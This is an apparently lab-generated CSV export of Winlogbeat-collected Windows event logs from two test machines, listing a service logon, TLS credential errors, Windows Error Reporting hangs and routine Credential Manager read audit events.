	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28770,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:05:31.996",T3jqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",36871,"Oct 23, 2022 @ 16:05:32.964","-",event,"-",Schannel,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",error,"A fatal error occurred while creating a TLS client credential. The internal error state is 10013.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,System,Manager,"-","-","-","-","-","-","-","-",10013,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",client,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",36871,"-","-","-","-","-","-",Info,656,"4,516","{1f678132-5938-4686-9fdc-c8ff68f15c85}",Schannel,5655,"-","NT AUTHORITY","S-1-5-18",SYSTEM,User,"-"
"Oct 23, 2022 @ 16:05:31.996",UXjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",1001,"Oct 23, 2022 @ 16:05:32.964","-",event,"-","Windows Error Reporting","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Fault bucket , type 0
Event Name: StoreAgentScanForUpdatesFailure0
Response: Not available
Cab Id: 0

Problem signature:
P1: Update;
P2: 80072f8f
P3: 19044
P4: 1889
P5: Windows.Desktop
P6: 
P7: 
P8: 
P9: 
P10: 

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER7DBF.tmp.WERInternalMetadata.xml

These files may be available here:
\\?\C:\ProgramData\Microsoft\Windows\WER\ReportQueue\NonCritical_Update;_a6e0ad66ac7dd0edc4cd648dbb8a907e97b01d_00000000_b425cd91-e373-4056-b584-c436de62ed36

Analysis symbol: 
Rechecking for solution: 0
Report Id: b425cd91-e373-4056-b584-c436de62ed36
Report Status: 524388
Hashed bucket: 
Cab Guid: 0","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","Windows.Desktop","
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER7DBF.tmp.WERInternalMetadata.xml","\\?\C:\ProgramData\Microsoft\Windows\WER\ReportQueue\NonCritical_Update;_a6e0ad66ac7dd0edc4cd648dbb8a907e97b01d_00000000_b425cd91-e373-4056-b584-c436de62ed36",0,0,"b425cd91-e373-4056-b584-c436de62ed36",524388,0,StoreAgentScanForUpdatesFailure0,"Not available",0,"Update;",80072f8f,19044,1889,1001,Classic,"-","-","-","-","-",Info,"-","-","-","Windows Error Reporting",4768,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:31.969",TnjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",36871,"Oct 23, 2022 @ 16:05:32.964","-",event,"-",Schannel,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",error,"A fatal error occurred while creating a TLS client credential. The internal error state is 10013.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,System,Manager,"-","-","-","-","-","-","-","-",10013,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",client,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",36871,"-","-","-","-","-","-",Info,656,"4,516","{1f678132-5938-4686-9fdc-c8ff68f15c85}",Schannel,5654,"-","NT AUTHORITY","S-1-5-18",SYSTEM,User,"-"
"Oct 23, 2022 @ 16:05:31.962",UHjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",1001,"Oct 23, 2022 @ 16:05:32.964","-",event,"-","Windows Error Reporting","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Fault bucket , type 0
Event Name: AppHangB1
Response: Not available
Cab Id: 0

Problem signature:
P1: explorer.exe
P2: 10.0.19041.1889
P3: d1439b88
P4: cf9e
P5: 134217728
P6: 
P7: 
P8: 
P9: 
P10: 

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER12BF.tmp.WERInternalMetadata.xml

These files may be available here:
\\?\C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppHang_explorer.exe_aaba19d9314c8d6a5b4fa78d04a77856dce8c0_d1f87d2a_f20fc64b-466f-49e4-93d0-7dba2e532824

Analysis symbol: 
Rechecking for solution: 0
Report Id: 3d822afd-77a2-4fe4-8bb8-bc04368e2c1d
Report Status: 524388
Hashed bucket: 
Cab Guid: 0","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",134217728,"
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER12BF.tmp.WERInternalMetadata.xml","\\?\C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppHang_explorer.exe_aaba19d9314c8d6a5b4fa78d04a77856dce8c0_d1f87d2a_f20fc64b-466f-49e4-93d0-7dba2e532824",0,0,"3d822afd-77a2-4fe4-8bb8-bc04368e2c1d",524388,0,AppHangB1,"Not available",0,"explorer.exe","10.0.19041.1889",d1439b88,cf9e,1001,Classic,"-","-","-","-","-",Info,"-","-","-","Windows Error Reporting",4767,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:31.930",TXjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",36871,"Oct 23, 2022 @ 16:05:32.964","-",event,"-",Schannel,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",error,"A fatal error occurred while creating a TLS client credential. The internal error state is 10013.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,System,Manager,"-","-","-","-","-","-","-","-",10013,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",client,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",36871,"-","-","-","-","-","-",Info,656,"4,516","{1f678132-5938-4686-9fdc-c8ff68f15c85}",Schannel,5653,"-","NT AUTHORITY","S-1-5-18",SYSTEM,User,"-"
"Oct 23, 2022 @ 16:05:31.928",THjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",1001,"Oct 23, 2022 @ 16:05:31.961","-",event,"-","Windows Error Reporting","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Fault bucket , type 0
Event Name: AppHangB1
Response: Not available
Cab Id: 0

Problem signature:
P1: explorer.exe
P2: 10.0.19041.1889
P3: d1439b88
P4: a874
P5: 134217728
P6: 
P7: 
P8: 
P9: 
P10: 

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER9A82.tmp.WERInternalMetadata.xml

These files may be available here:
\\?\C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppHang_explorer.exe_4214a28a19fc6b555ce45be688ab0e6375dd135_d1f87d2a_494bf802-dbdc-49b9-8514-c05f0c316b4b

Analysis symbol: 
Rechecking for solution: 0
Report Id: 6f366c29-a616-4fe0-a516-5282d1e507b2
Report Status: 524388
Hashed bucket: 
Cab Guid: 0","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",134217728,"
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER9A82.tmp.WERInternalMetadata.xml","\\?\C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppHang_explorer.exe_4214a28a19fc6b555ce45be688ab0e6375dd135_d1f87d2a_494bf802-dbdc-49b9-8514-c05f0c316b4b",0,0,"6f366c29-a616-4fe0-a516-5282d1e507b2",524388,0,AppHangB1,"Not available",0,"explorer.exe","10.0.19041.1889",d1439b88,a874,1001,Classic,"-","-","-","-","-",Info,"-","-","-","Windows Error Reporting",4766,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:31.664",VHjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:32.997","Oct 23, 2022 @ 16:16:26.867",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","MicrosoftAccount:user=02xmqstzqqguctlc","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31162,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:31.664",VXjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:32.997","Oct 23, 2022 @ 16:16:26.867",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","MicrosoftAccount:user=02xmqstzqqguctlc","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31163,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:31.663",U3jqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:32.997","Oct 23, 2022 @ 16:16:26.865",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","MicrosoftAccount:user=02xmqstzqqguctlc","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31161,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:31.662",UnjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:32.997","Oct 23, 2022 @ 16:16:26.864",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","MicrosoftAccount:user=02xmqstzqqguctlc","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31160,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.745",SXjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.863",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0x55CC0
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",MANAGER,0x55cc0,vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","-","WindowsLive:(token):name=02emsisgxyqkbiia;serviceuri=*","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x55cc0,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31157,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.745",SnjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.863",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0x55CC0
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",MANAGER,0x55cc0,vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","-","WindowsLive:(cert):name=02emsisgxyqkbiia;serviceuri=*","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x55cc0,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31158,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.745",S3jqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.864",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0x55CC0
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,1,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",0,"-","-","-","-","-",MANAGER,0x55cc0,vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","-","WindowsLive:target=virtualapp/didlogical","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x55cc0,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31159,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.716",RnjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.861",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","MicrosoftAccount:user=02xmqstzqqguctlc","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31154,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.716",R3jqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.861",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","WindowsLive:(token):name=02xmqstzqqguctlc;serviceuri=*","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31155,"User Account Management","-","-","-","-","-"
